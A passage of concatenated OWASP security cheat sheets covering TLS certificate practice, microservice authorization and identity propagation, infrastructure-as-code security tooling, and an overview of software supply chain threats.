### Carefully Consider the use of Wildcard Certificates

Wildcard certificates can be convenient, however they violate [the principle of least privilege](https://wiki.owasp.org/index.php/Least_privilege), as a single certificate is valid for all subdomains of a domain (such as *.example.org). Where multiple systems are sharing a wildcard certificate, the likelihood that the private key for the certificate is compromised increases, as the key may be present on multiple systems. Additionally, the value of this key is significantly increased, making it a more attractive target for attackers.

The issues around the use of wildcard certificates are complicated, and there are [various](https://blog.sean-wright.com/wildcard-certs-not-quite-the-star/) other [discussions](https://gist.github.com/joepie91/7e5cad8c0726fd6a5e90360a754fc568) of them online.

When risk assessing the use of wildcard certificates, the following areas should be considered:

- Only use wildcard certificates where there is a genuine need, rather than for convenience.
    - Consider the use of the [ACME](https://en.wikipedia.org/wiki/Automated_Certificate_Management_Environment) to allow systems to automatically request and update their own certificates instead.
- Never use a wildcard certificates for systems at different trust levels.
    - Two VPN gateways could use a shared wildcard certificate.
    - Multiple instances of a web application could share a certificate.
    - A VPN gateway and a public web server **should not** share a wildcard certificate.
    - A public web server and an internal server **should not** share a wildcard certificate.
- Consider the use of a reverse proxy server which performs TLS termination, so that the wildcard private key is only present on one system.
- A list of all systems sharing a certificate should be maintained to allow them all to be updated if the certificate expires or is compromised.
- Limit the scope of a wildcard certificate by issuing it for a subdomain (such as `*.foo.example.org`), or a for a separate domain.

### Use an Appropriate Certification Authority for the Application's User Base

In order to be trusted by users, certificates must be signed by a trusted certificate authority (CA). For Internet facing applications, this should be one of the CAs which are well-known and automatically trusted by operating systems and browsers.

The [LetsEncrypt](https://letsencrypt.org) CA provides free domain validated SSL certificates, which are trusted by all major browsers. As such, consider whether there are any benefits to purchasing a certificate from a CA.

For internal applications, an internal CA can be used. This means that the FQDN of the certificate will not be exposed (either to an external CA, or publicly in certificate transparency lists). However, the certificate will only be trusted by users who have imported and trusted the internal CA certificate that was used to sign them.

### Use CAA Records to Restrict Which CAs can Issue Certificates

Certification Authority Authorization (CAA) DNS records can be used to define which CAs are permitted to issue certificates for a domain. The records contains a list of CAs, and any CA who is not included in that list should refuse to issue a certificate for the domain. This can help to prevent an attacker from obtaining unauthorized certificates for a domain through a less-reputable CA. Where it is applied to all subdomains, it can also be useful from an administrative perspective by limiting which CAs administrators or developers are able to use, and by preventing them from obtaining unauthorized wildcard certificates.

### Consider the Certificate’s Validation Type

Certificates come in different types of validation. Validation is the process the Certificate Authority (CA) uses to make sure you are allowed to have the certificate. This is authorization. The [CA/Browser Forum](https://cabforum.org/working-groups/server/baseline-requirements/documents/) is an organization made of CA and browser vendors, as well as others with an interest in web security. They set the rules which CAs must follow based on the validation type. The base validation is called Domain Validated (DV). All publicly issued certificates must be domain validated. This process involves practical proof of control of the name or endpoint requested in the certificate. This usually involves a challenge and response in DNS, to an official email address, or to the endpoint that will get the certificate.

Organization Validated (OV) certificates include the requestor’s organization information in the certificates subject. E.g. C = GB, ST = Manchester, **O = Sectigo Limited**, CN = sectigo.com. The process to acquire an OV certificate requires official contact with the requesting company via a method that proves to the CA that they are truly talking to the right company.

Extended validation (EV) certificates provide an even higher level of verification as well as all the DV and OV verifications. This can effectively be viewed as the difference between "This site is really run by Example Company Inc." vs "This domain is really example.org". [Latest Extended Validation Guidelines](https://cabforum.org/working-groups/server/extended-validation/guidelines/)

Historically these displayed differently in the browser, often showing the company name or a green icon or background in the address bar. However, as of 2019 no major browser shows EV status like this as they do not believe that EV certificates provide any additional protection. ([Chromium](https://groups.google.com/a/chromium.org/forum/m/#!msg/security-dev/h1bTcoTpfeI/jUTk1z7VAAAJ) Covering Chrome, Edge, Brave, and Opera. [Firefox](https://groups.google.com/forum/m/?fromgroups&hl=en#!topic/firefox-dev/6wAg_PpnlY4) [Safari](https://cabforum.org/2018/06/06/minutes-of-the-f2f-44-meeting-in-london-england-6-7-june-2018/#apple-root-program-update))

As all browsers and TLS stacks are unaware of the difference between DV, OV, and EV certificates, they are effectively the same in terms of security. An attacker only needs to reach the level of practical control of the domain to get a rogue certificate.  The extra work for an attacker to get an OV or EV certificate in no way increases the scope of an incident. In fact, those actions would likely mean detection. The additional pain in getting OV and EV certificates may create an availability risk and their use should be reviewed with this in mind.

## Application

### Use TLS For All Pages

TLS should be used for all pages, not just those that are considered sensitive such as the login page. If there are any pages that do not enforce the use of TLS, these could give an attacker an opportunity to sniff sensitive information such as session tokens, or to inject malicious JavaScript into the responses to carry out other attacks against the user.

For public facing applications, it may be appropriate to have the web server listening for unencrypted HTTP connections on port 80, and then immediately redirecting them with a permanent redirect (HTTP 301) in order to provide a better experience to users who manually type in the domain name. This should then be supported with the [HTTP Strict Transport Security (HSTS)](#use-http-strict-transport-security) header to prevent them accessing the site over HTTP in the future.

API-only endpoints should disable HTTP altogether and only support encrypted connections. When that is not possible, API endpoints should fail requests made over unencrypted HTTP connections instead of redirecting them.

### Do Not Mix TLS and Non-TLS Content

A page that is available over TLS should not include any resources (such as JavaScript or CSS) files which are loaded over unencrypted HTTP. These unencrypted resources could allow an attacker to sniff session cookies or inject malicious code into the page. Modern browsers will also block attempts to load active content over unencrypted HTTP into secure pages.

### Use the "Secure" Cookie Flag

All cookies should be marked with the "[Secure](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies#Secure_and_HttpOnly_cookies)" attribute, which instructs the browser to only send them over encrypted HTTPS connections, in order to prevent them from being sniffed from an unencrypted HTTP connection. This is important even if the website does not listen on HTTP (port 80), as an attacker performing an active man in the middle attack could present a spoofed web server on port 80 to the user in order to steal their cookie.

### Prevent Caching of Sensitive Data

Although TLS provides protection of data while it is in transit, it does not provide any protection for data once it has reached the requesting system. As such, this information may be stored in the cache of the user's browser, or by any intercepting proxies which are configured to perform TLS decryption.

Where sensitive data is returned in responses, HTTP headers should be used to instruct the browser and any proxy servers not to cache the information, in order to prevent it being stored or returned to other users. This can be achieved by setting the following HTTP headers in the response:

```text
Cache-Control: no-cache, no-store, must-revalidate
Pragma: no-cache
Expires: 0
```

### Use HTTP Strict Transport Security

HTTP Strict Transport Security (HSTS) instructs the user's browser to always request the site over HTTPS, and also prevents the user from bypassing certificate warnings. See the [HTTP Strict Transport Security Cheat Sheet](HTTP_Strict_Transport_Security_Cheat_Sheet.md) for further information on implementing HSTS.

### Client Certificates and Mutual TLS

In a typical TLS configuration, a certificate on the server allows the client to verify the server's identity and provides an encrypted connection between them. However, this approach has two main weaknesses:

- The server lacks a mechanism to verify the client's identity.
- An attacker, obtaining a valid certificate for the domain, can intercept the connection. This interception is often used by businesses to inspect TLS traffic, by installing a trusted CA certificate on their client systems.

Client certificates, central to mutual TLS (mTLS), address these issues. In mTLS, both the client and server authenticate each other using TLS. The client proves their identity to the server with their own certificate. This not only enables strong authentication of the client but also prevents an intermediate party from decrypting TLS traffic, even if they have a trusted CA certificate on the client system.

Challenges and Considerations

Client certificates are rarely used in public systems due to several challenges:

- Issuing and managing client certificates involves significant administrative overhead.
- Non-technical users may find installing client certificates difficult.
- Organizations' TLS decryption practices can cause client certificate authentication, a key component of mTLS, to fail.

Despite these challenges, client certificates and mTLS should be considered for high-value applications or APIs, particularly where users are technically sophisticated or part of the same organization.

### Public Key Pinning

Public key pinning can be used to provides assurance that the server's certificate is not only valid and trusted, but also that it matches the certificate expected for the server. This provides protection against an attacker who is able to obtain a valid certificate, either by exploiting a weakness in the validation process, compromising a trusted certificate authority, or having administrative access to the client.

Public key pinning was added to browsers in the HTTP Public Key Pinning (HPKP) standard. However, due to a number of issues, it has subsequently been deprecated and is no longer recommended or [supported by modern browsers](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Public-Key-Pins).

However, public key pinning can still provide security benefits for mobile applications, thick clients and server-to-server communication. This is discussed in further detail in the [Pinning Cheat Sheet](Pinning_Cheat_Sheet.md).

## Related Articles

- OWASP - [Testing for Weak TLS](https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/09-Testing_for_Weak_Cryptography/01-Testing_for_Weak_Transport_Layer_Security)
- OWASP - [Application Security Verification Standard (ASVS) - Communication Security Verification Requirements (V9)](https://github.com/OWASP/ASVS/blob/v4.0.1/4.0/en/0x17-V9-Communications.md)
- Mozilla - [Mozilla Recommended Configurations](https://wiki.mozilla.org/Security/Server_Side_TLS#Recommended_configurations)
- NIST - [SP 800-52 Rev. 2 Guidelines for the Selection, Configuration, and Use of Transport Layer Security (TLS) Implementations](https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-52r2.pdf)
- NIST - [NIST SP 800-57 Recommendation for Key Management, Revision 5](https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-57pt1r5.pdf)
- NIST - [SP 800-95 Guide to Secure Web Services](https://nvlpubs.nist.gov/nistpubs/Legacy/SP/nistspecialpublication800-95.pdf)
- IETF - [RFC 5280 Internet X.509 Public Key Infrastructure Certificate and Certificate Revocation List (CRL) Profile](https://tools.ietf.org/html/rfc5280)
- IETF - [RFC 2246 The Transport Layer Security (TLS) Protocol Version 1.0 (JAN 1999)](https://tools.ietf.org/html/rfc2246)
- IETF - [RFC 4346 The Transport Layer Security (TLS) Protocol Version 1.1 (APR 2006)](https://tools.ietf.org/html/rfc4346)
- IETF - [RFC 5246 The Transport Layer Security (TLS) Protocol Version 1.2 (AUG 2008)](https://tools.ietf.org/html/rfc5246)


---
# Microservices_Security_Cheat_Sheet.md

# Microservices Security Cheat Sheet

## Introduction

The microservice architecture is being increasingly used for designing and implementing application systems in both cloud-based and on-premise infrastructures, high-scale applications and services. There are many security challenges that need to be addressed in the application design and implementation phases. The fundamental security requirements that have to be addressed during design phase are authentication and authorization. Therefore, it is vital for applications security architects to understand and properly use existing architecture patterns to implement authentication and authorization in microservices-based systems. The goal of this cheat sheet is to identify such patterns and to do recommendations for applications security architects on possible ways to use them.

## Edge-level authorization

In simple scenarios, authorization can happen only at the edge level (API gateway). The API gateway can be leveraged to centralize enforcement of authorization for all downstream microservices, eliminating the need to provide authentication and access control for each of the individual services. In such cases, NIST recommends implementing mitigating controls such as mutual authentication to prevent direct, anonymous connections to the internal services (API gateway bypass). It should be noted that authorization at the edge layer has the [following limitations](https://www.youtube.com/watch?v=UnXjwCWgBKU):

- Pushing all authorization decisions to the API gateway can quickly become hard to manage in complex ecosystems with many roles and access control rules.
- The API gateway may become a single point of decision that may violate the “defense in depth” principle.
- Operation teams typically own the API gateway, so development teams cannot directly make authorization changes, slowing down velocity due to additional communication and process overhead.
  
In most cases, development teams implement authorization in both places – at the edge level at a coarse level of granularity, and at service level. To authenticate an external entity, the edge can use access tokens (referenced token or self-contained token) transmitted via HTTP headers (e.g., “Cookie” or “Authorization”) or use mTLS.

## Service-level authorization

Service-level authorization gives each microservice more control to enforce access control policies.
For further discussion, we will use terms and definitions according with [NIST SP 800-162](https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-162.pdf). The functional components of an access control system can be classified as follows:

- Policy Administration Point (PAP): Provides a user interface for creating, managing, testing, and debugging access control rules.
- Policy Decision Point (PDP): Computes access decisions by evaluating the applicable access control policy.
- Policy Enforcement Point (PEP): Enforces policy decisions in response to a request from a subject requesting access to a protected object.
- Policy Information Point (PIP): Serves as the retrieval source of attributes or the data required for policy evaluation to provide the information needed by the PDP to make decisions.

![NIST ABAC framework](../assets/NIST_ABAC.png)

### Service-level authorization: existing patterns

#### Decentralized pattern

The development team implements PDP and PEP directly at the microservice code level. All the access control rules and attributes that need to implement that rule are defined and stored on each microservice (step 1). When a microservice receives a request along with some authorization metadata (e.g., end user context or requested resource ID), the microservice analyzes it (step 3) to generate an access control policy decision and then enforces authorization (step 4).
![Decentralized pattern HLD](../assets/Dec_pattern_HLD.png)

Existing programming language frameworks allow development teams to implement authorization at the microservice layer. For example, [Spring Security allows](https://www.youtube.com/watch?v=v2J32nd0g24) developers to enable scopes checking (e.g., using scopes extracted from incoming JWT) in the resource server and use it to enforce authorization.

Implementing authorization at the source code level means that the code must be updated whenever the development team wants to modify authorization logic.

#### Centralized pattern with single policy decision point

In this pattern, access control rules are defined, stored, and evaluated centrally. Access control rules are defined using PAP (step 1) and delivered to a centralized PDP, along with attributes required to evaluate those rules (step 2). When a subject invokes a microservice endpoint (step 3), the microservice code invokes the centralized PDP via a network call, and the PDP generates an access control policy decision by evaluating the query input against access control rules and attributes (step 4). Based on the PDP decision, the microservice enforces authorization (step 5).

![Centralized pattern with single policy decision point HLD](../assets/Single_PDP_HLD.png)

To define access control rules, development/operation teams have to use some language or notation. An example is Extensible Access Control Markup Language (XACML) and Next Generation Access Control (NGAC), which is a standard to describe policy rules.

This pattern can cause latency issues due to additional network calls to the remote PDP endpoint, but it can be mitigated by caching authorization policy decisions at the microservice level. It should be mentioned that the PDP must be operated in high-availability mode to prevent resilience and availability issues. Application security architects should combine it with other patterns (e.g., authorization on API gateway level) to enforce the "defense in depth" principle.

#### Centralized pattern with embedded policy decision point

In this pattern, access control rules are defined centrally but stored and evaluated at the microservice level. Access control rules are defined using PAP (step 1) and delivered to an embedded PDP, along with attributes required to evaluate those rules (step 2). When a subject invokes a microservice endpoint (step 3), the microservice code invokes the PDP, and the PDP generates an access control policy decision by evaluating the query input against access control rules and attributes (step 4). Based on the PDP decision, the microservice enforces authorization (step 5).

![Centralized pattern with embedded policy decision point HLD](../assets/Embed_PDP_HLD.png)

The PDP code in this case, can be implemented as a microservice built-in library or sidecar in a service mesh architecture. Due to possible network/host failures and network latency, it is advisable to implement embedded PDP as a microservice library or sidecar on the same host as the microservice. Embedded PDP usually stores authorization policy and policy-related data in-memory to minimize external dependencies during authorization enforcement and get low latency. The main difference from the “Centralized pattern with single policy decision point” approach, is that authorization *decisions* do not store on the microservice side, up-to-date authorization *policy* is stored on the microservice side instead. It should be mentioned that caching authorization decisions may lead to applying outdated authorization rules and access control violations.

Netflix presented ([link](https://www.youtube.com/watch?v=R6tUNpRpdnY), [link](https://conferences.oreilly.com/velocity/vl-ca-2018/public/schedule/detail/66606.html)) a real case of using “Centralized pattern with embedded PDP” pattern to implement authorization on the microservices level.

![Centralized pattern with embedded policy decision point HLD](../assets/Netflix_AC.png)

- The Policy portal and Policy repository are UI-based systems for creating, managing, and versioning access control rules.
- The Aggregator fetches data used in access control rules from all external sources and keeps it up to date.
- The Distributor pulls access control rules (from the Policy repository) and data used in access control rules (from Aggregators) to distribute them among PDPs.
- The PDP (library) asynchronously pulls access control rules and data and keeps them up to date to enforce authorization by the PEP component.

### Recommendations on how to implement authorization

1. To achieve scalability, it is not advisable to hardcode authorization policy in source code (decentralized pattern) but use a special language to express policy instead. The goal is to externalize/decouple authorization from code, and not just with a gateway/proxy acting as a checkpoint. The recommended pattern for service-level authorization is "Centralized pattern with embedded PDP" due to its resilience and wide adoption.
2. The authorization solution should be a platform-level solution; a dedicated team (e.g., Platform security team) must be accountable for the development and operation of the authorization solution as well as sharing microservice blueprint/library/components that implement authorization among development teams.
3. The authorization solution should be based on widely-used solutions because implementing a custom solution has the following cons:
    - Security or engineering teams have to build and maintain a custom solution.
    - It is necessary to build and maintain client library SDKs for every language used in the system architecture.
    - There is a necessity to train every developer on custom authorization service API and integration, and there’s no open-source community to source information from.
4. There is a probability that not all access control policies can be enforced by gateways/proxies and shared authorization library/components, so some specific access control rules still have to be implemented on microservice business code level. In order to do that, it is advisable to have microservice development teams use simple questionnaires/check-lists to uncover such security requirements and handle them properly during microservice development.
5. It is advisable to implement the “defense in depth” principle and enforce authorization on:
    - Gateway and proxy level, at a coarse level of granularity.
    - Microservice level, using shared authorization library/components to enforce fine-granted decisions.
    - Microservice business code level, to implement business-specific access control rules.
6. Formal procedures on access control policy must be implemented on development, approval and rolling-out.

## External Entity Identity Propagation

To make fine-grained authorization decisions at the microservice level, a microservice has to understand the caller’s context (e.g., user ID, user roles/groups). In order to allow the internal service layer to enforce authorization, the edge layer has to propagate an authenticated external entity identity (e.g., end user context) along with a request to downstream microservices. One of the simplest ways to propagate external entity identity is to reuse the access token received by the edge and pass it to internal microservices. However, it should be mentioned that this approach is highly insecure due to possible external access token leakage and may increase an attack surface because the communication relies on a proprietary token-based system implementation. If an internal service is unintentionally exposed to the external network, then it can be directly accessed using the leaked access token. This attack is not possible if the internal service only accepts a token format known only to internal services. This pattern is also not external access token agnostic, i.e., internal services have to understand external access tokens and support a wide range of authentication techniques to extract identity from different types of external tokens (e.g., JWT, cookie, OpenID Connect token).

### Identity propagation: existing patterns

#### Sending the external entity identity as clear or self-signed data structures

In this approach, the microservice extracts the external entity identity from the incoming request (e.g., by parsing the incoming access token), creates a data structure (e.g., JSON or self-signed JWT) with that context, and passes it on to an internal microservice.
In this scenario, the recipient microservice has to trust the calling microservice. If the calling microservice wants to violate access control rules, it can do so by setting any user/client ID or user roles it wants in the HTTP header. This approach is suitable only in highly trusted environments where every microservice is developed by a trusted development team that applies secure software development practices.

#### Using a data structure signed by a trusted issuer

In this pattern, after the external request is authenticated by the authentication service at the edge layer, a data structure representing the external entity identity (e.g., containing user ID, user roles/groups, or permissions) is generated, signed, or encrypted by the trusted issuer and propagated to internal microservices.
![Signed ID propagation](../assets/Signed_ID_propogation.png)

[Netflix presented](https://www.infoq.com/presentations/netflix-user-identity/) a real-world case of using that pattern: a structure called “Passport” that contains the user ID and its attributes and which is HMAC protected at the edge level for each incoming request. This structure is propagated to internal microservices and never exposed outside.

1. The Edge Authentication Service (EAS) obtains a secret key from the Key Management System.
2. EAS receives an access token (e.g., in a cookie, JWT, OAuth2 token) from the incoming request.
3. EAS decrypts the access token, resolves the external entity identity, and sends it to the internal services in the signed “Passport” structure.
4. Internal services can extract user identity to enforce authorization (e.g., to implement identity-based authorization) using wrappers.
5. If necessary, internal service can propagate the “Passport” structure to downstream services in the call chain.

![Netflix ID propagation approach](../assets/Netflix_ID_prop.png)
It should be mentioned that the pattern is external access token agnostic and allows for decoupling of external entities from their internal representations.

### Recommendation on how to implement identity propagation

1. In order to implement an external access token agnostic and extendable system, decouple the access tokens issued for an external entity from its internal representation. Use a single data structure to represent and propagate the external entity identity among microservices. The edge-level service has to verify the incoming external access token, issue an internal entity representation structure, and propagate it to downstream services.
2. Using an internal entity representation structure signed (symmetric or asymmetric encryption) by a trusted issuer is a recommended pattern adopted by the community.
3. The internal entity representation structure should be extensible to enable adding more claims that may lead to low latency.
4. The internal entity representation structure must not be exposed outside (e.g., to a browser or external device)

## Service-to-service authentication

### Existing patterns

#### Mutual transport layer security

With an mTLS approach, each microservice can legitimately identify who it talks to, in addition to achieving confidentiality and integrity of the transmitted data. Each microservice in the deployment has to carry a public/private key pair and use that key pair to authenticate to the recipient microservices via mTLS. mTLS is usually implemented with a self-hosted Public Key Infrastructure. The main challenges of using mTLS are key provisioning and trust bootstrap, certificate revocation, and key rotation.

#### Token-based

The token-based approach works at the application layer. A token is a container that may contain the caller ID (microservice ID) and its permissions (scopes). The caller microservice can obtain a signed token by invoking a special security token service using its own service ID and password and then attaches it to every outgoing request, e.g., via HTTP headers. The called microservice can extract the token and validate it online or offline.
![Signed ID propagation](../assets/Token_validation.png)

1. Online scenario:
    - To validate incoming tokens, the microservice invokes a centralized service token service via network call.
    - Revoked (compromised) tokens can be detected.
    - High latency.
    - Should be applied to critical requests.
2. Offline scenario:
    - To validate incoming tokens, the microservice uses the downloaded service token service public key.
    - Revoked (compromised) tokens may not be detected.
    - Low latency.
    - Should be applied to non-critical requests.
In most cases, token-based authentication works over TLS, which provides confidentiality and integrity of data in transit.

## Logging

Logging services in microservice-based systems aim to meet the principles of accountability and traceability and help detect security anomalies in operations via log analysis. Therefore, it is vital for application security architects to understand and adequately use existing architecture patterns to implement audit logging in microservices-based systems for security operations. A high-level architecture design is shown in the picture below and is based on the following principles:

- Each microservice writes a log message to a local file using standard output (via stdout, stderr).
- The logging agent periodically pulls log messages and sends (publishes) them to the message broker (e.g., NATS, Apache Kafka).
- The central logging service subscribes to messages in the message broker, receives them, and processes them.
![Logging pattern](../assets/ms_logging_pattern.png)

High-level recommendations to logging subsystem architecture with its rationales are listed below.

1. Microservice shall not send log messages directly to the central logging subsystem using network communication. Microservice shall write its log message to a local log file:
    - this allows to mitigate the threat of data loss due to logging service failure due to attack or in case of its flooding by legitimate microservice
    - in case of logging service outage, microservice will still write log messages to the local file (without data loss), and after logging service recovery, logs will be available to shipping;
2. There shall be a dedicated component (logging agent) decoupled from the microservice. The logging agent shall collect log data on the microservice  (read local log file) and send it to the central logging subsystem. Due to possible network latency issues, the logging agent shall be deployed on the same host (virtual or physical machine) with the microservice:
    - this allows mitigating the threat of data loss due to logging service failure due to attack or in case of its flooding by legitimate microservice
    - in case of logging agent failure, microservice still writes information to the log file, logging agent after recovery will read the file and send information to message broker;
3. A possible DoS attack on the central logging subsystem logging agent shall not use an asynchronous request/response pattern to send log messages. There shall be a message broker to implement the asynchronous connection between the logging agent and central logging service:
    - this allows to mitigate the threat of data loss due to logging service failure in case of its flooding by legitimate microservice
    - in case of logging service outage, microservice will still write log messages to the local file (without data loss), and after logging service recovery, logs will be available to shipping;
4. Logging agent and message broker shall use mutual authentication (e.g., based on TLS) to encrypt all transmitted data (log messages) and authenticate themselves:
    - this allows mitigating threats such as: microservice spoofing, logging/transport system spoofing, network traffic injection, sniffing network traffic
5. Message broker shall enforce access control policy to mitigate unauthorized access and implement the principle of least privileges:
    - this allows mitigating the threat of microservice elevation of privileges
6. Logging agent shall filter/sanitize output log messages to make sure that sensitive data (e.g., PII, passwords, API keys) is never sent to the central logging subsystem (data minimization principle). For a comprehensive overview of items that should be excluded from logging, please see the [OWASP Logging Cheat Sheet](Logging_Cheat_Sheet.md#data-to-exclude).
7. Microservices shall generate a correlation ID that uniquely identifies every call chain and helps group log messages to investigate them. The logging agent shall include a correlation ID in every log message.
8. The logging agent shall periodically provide health and status data to indicate its availability or non-availability.
9. The logging agent shall publish log messages in a structured logs format (e.g., JSON, CSV).
10. The logging agent shall append log messages with context data, e.g., platform context (hostname, container name), runtime context (class name, filename).

For a comprehensive overview of events that should be logged and possible data format, please see the [OWASP Logging Cheat Sheet](Logging_Cheat_Sheet.md#which-events-to-log) and [Application Logging Vocabulary Cheat Sheet](Logging_Vocabulary_Cheat_Sheet.md)

## References

- [NIST Special Publication 800-204](https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-204.pdf) “Security Strategies for Microservices-based Application Systems”
- [NIST Special Publication 800-204A](https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-204A.pdf) “Building Secure Microservices-based Applications Using Service-Mesh Architecture”
- [Microservices Security in Action](https://www.manning.com/books/microservices-security-in-action), Prabath Siriwardena and Nuwan Dias, 2020, Manning


---
# Infrastructure_as_Code_Security_Cheat_Sheet.md

# Infrastructure as Code Security Cheatsheet

<!---
Copyright 2021 Nokia
Licensed under the Creative Commons Attribution-ShareAlike 3.0 Unported License
SPDX-License-Identifier: CC-BY-SA-3.0
--->

## Introduction

Infrastructure as code (IaC), also known as software-defined infrastructure, allows the configuration and deployment of infrastructure components faster with consistency by allowing them to be defined as a code and also enables repeatable deployments across environments.

### Security best practices

Here are some of the security best practices for IaC that can be easily integrated into the Software Development Lifecycle:

### Develop and Distribute

- IDE plugins - Leverage standard security plug-ins in the integrated development environment (IDE) which helps in the early detection of potential risks and drastically reduces the time to address any issues later in the development cycle. Plugins such as TFLint, Checkov, Docker Linter, docker-vulnerability-extension, Security Scan, Contrast Security, etc., help in the security assessment of the IaC.
- Threat modelling - Build the threat modelling landscape earlier in the development cycle to ensure there is enough visibility of the high-risk, high-volume aspects of the code and flexibility to include security throughout to ensure the assets are safely managed.
- Managing secrets -  Secrets are confidential data and information such as application tokens required for authentication, passwords, and SSH (Secure Shell) keys. The problem is not the secrets, but where you store them. If you are using a simple text file or SCMs like Git, then the secrets can be easily exposed. Open-source tools such as truffleHog, git-secrets, GitGuardian and similar can be utilized to detect such vulnerable management of secrets. See the [Secrets Management Cheat Sheet](Secrets_Management_Cheat_Sheet.md) for more information.
- Version control - Version control is the practice of tracking and managing changes to software code. Ensure all the changes to the IaC are tracked with the right set of information that helps in any revert operation. The important part is that you’re checking in those changes alongside the features they support and not separately. A feature’s infrastructure requirements should be a part of a feature’s branch or merge request. Git is generally used as the source code version control system.
- Principle of least privilege - define the access management policies based on the principle of least privilege with the following priority items:
  
    - Defining who is and is not authorized to create/update/run/delete the scripts and inventory.
    - Limiting the permissions of authorized IaC users to what is necessary to perform their tasks. The IaC scripts should ensure that the permissions granted to the various resources it creates are limited to what is required for them to perform their work.

- Static analysis - Analyzes code in isolation, identifying risks, misconfigurations, and compliance faults only relevant to the IaC itself. Tools such as kubescan, Snyk, Coverity etc, can be leveraged for static analysis of IaC.
- Open Source dependency check - Analyzes the open source dependencies such as OS packages, libraries, etc., to identify potential risks. Tools such as BlackDuck, Snyk, WhiteSource Bolt for GitHub, and similar can be leveraged for open source dependency analysis of IaC.
- Container image scan - Image scanning refers to the process of analyzing the contents and the build process of a container image in order to detect security issues, vulnerabilities or potential risks. Open-source tools such as Dagda, Clair, Trivy, Anchore, etc., can be leveraged for container image analysis.
CI/CD pipeline and Consolidated reporting - enabling the security checks to be made available in the CI/CD pipeline enables the analysis of each of the code changes, excludes the need for manual intervention, and enables maintaining the history of compliance. Along with consolidated reporting, these integrations enhance the speed of development of a secure IaC codebase. Open-source tools such as Jenkins, etc., can be leveraged to build the CI/CD pipelines, and DefectDojo and OWASP Glue can help in tying the checks together and visualizing the check results in a single dashboard.
- Artifact signing - Digital signing of artifacts at build time and validation of the signed data before use protects artifacts from tampering between build and runtime, thus ensuring the integrity and provenance of an artifact. Open-source tools such as TUF helps in the digital signing of artifacts.

### Deploy

- Inventory management:
    - Commissioning - whenever a resource is deployed, ensure the resource is labeled, tracked and logged as part of the inventory management.
    - Decommissioning - whenever a resource deletion is initiated, ensure the underlying configurations are erased, data is securely deleted and the resource is completely removed from the runtime as well as from the inventory management.
    - Tagging - It is essential to tag cloud assets properly. During IaC operations, untagged assets are most likely to result in ghost resources that make it difficult to detect, visualize, and gain observability within the cloud environment and can affect the posture causing a drift. These ghost resources can add to billing costs, make maintenance difficult, and affect the reliability. The only solution to this is careful tagging and monitoring for untagged resources.
- Dynamic analysis - Dynamic analysis helps in evaluating any existing environments and services that it will interoperate with or run on. This helps in uncovering potential risks due to the interoperability. Open-source tools such as ZAP, Burp, GVM, etc., can be leveraged for dynamic analysis.

### Runtime

- Immutability of infrastructure - The idea behind immutable infrastructure is to build the infrastructure components to an exact set of specifications. No deviation, no changes. If a change to a specification is required, then a whole new set of infrastructure is provisioned based on the updated requirements, and the previous infrastructure is taken out of service as obsolete.
- Logging - Keeping a record is a critical aspect to keeping an eye on risks. You should enable logging - both security logs and audit logs - while provisioning infrastructure, as they help assess the security risks related to sensitive assets. They also assist in analyzing the root cause of incidents and in identifying potential threats. Open-source tools such as ELK, etc., can be leveraged for log analysis.
- Monitoring - Continuous monitoring assists in looking out for any security and compliance violations, helps in identifying attacks and also provides alerts upon such incidents. Certain solutions also incorporate new technologies like AI to identify potential threats early. Open-source tools such as Prometheus, Grafana, etc., can be leveraged for monitoring of cloud infrastructure.
- Runtime threat detection: Implementing a runtime threat detection solution helps in recognizing unexpected application behavior and alerts on threats at runtime. Open-source tools such as Falco, etc., can be leveraged for runtime threat detection. Certain application such as Contrast (Contrast Community Edition) can also detect OWASP Top 10 attacks on the application during runtime and help block them in order to protect and secure the application.

## References

- Securing Infrastructure as code: <https://www.opcito.com/blogs/securing-infrastructure-as-code>
- Infrastructure as code security: <https://dzone.com/articles/infrastructure-as-code-security>
- Shifting cloud security left with infrastructure as code: <https://securityboulevard.com/2020/04/shifting-cloud-security-left-with-infrastructure-as-code/>


---
# Software_Supply_Chain_Security_Cheat_Sheet.md

# Software Supply Chain Security

## Introduction

No piece of software is developed in a vacuum; regardless of the technologies used to develop it, software is embedded in a Software Supply Chain (SSC). According to [NIST](https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-204D.pdf), an entity's SSC can be defined as "a collection of steps that create, transform, and assess the quality and  policy conformance of software artifacts". From a developer's perspective, these steps span the entire SDLC and are accomplished using a wide range of components and tools. Common examples (by no means exhaustive) of components that are especially relevant from a developer's perspective include:

- IDEs and code editors
- Internally developed source code
- Third-party software libraries
- Version control systems (VCS)
- Build tools (Maven, Rake, make, Grunt, etc.)
- CI/CD software (Jenkins, CircleCI, TeamCity, etc.)
- Configuration management tools (Ansible, Puppet, Chef, etc.)
- Package management software and ecosystems (pip, npm, Composer, etc.)

Each of these components must be secured; a flaw in a single component, such as a vulnerable third-party dependency or misconfigured VCS, can put an entire SSC in jeopardy. Thus, in order to strengthen Software Supply Chain Security (SCSS), developers should possess a general understanding of what the SSC is, common threats against it, and practices and techniques that can be applied to reduce SSC risk.

## Overview of Threat Landscape

Given the breadth and complexity of the SSC, it is unsurprising that the threat landscape for SSC is similarly expansive. Threats include [dependency confusion](https://fossa.com/blog/dependency-confusion-understanding-preventing-attacks/), compromise of an upstream providers infrastructure, theft of code signing certificates, and CI/CD system exploits. More broadly, threats may be grouped into four categories based upon what component of the supply chain they seek to compromise [[4,5](#references)]:

- Source code threats. These type of threats focus on violating the integrity of a source code which is then built and and deployed or potentially consumed by other software projects. Threats in this category include VCS exploits, the introduction of malicious or vulnerable code into a codebase, or building code from an unauthorized branch.
- Build environment threats. These threats modify a software artifact but without altering the underlying source code or exploiting the build process itself. Examples include build cache poisoning, compromising a privileged account used by the build tool, or publishing software built from an untrusted source.
- Dependency related threats. Threats that result from the consumption of both direct and transitive software dependencies. The most common threat is using a vulnerable or compromised dependency.
- Deployment and runtime threats. These threats exploit either the deployment process or runtime environment. Common examples include compromising a privilege CI/CD account, software misconfigurations, and deployment of compromised binaries.

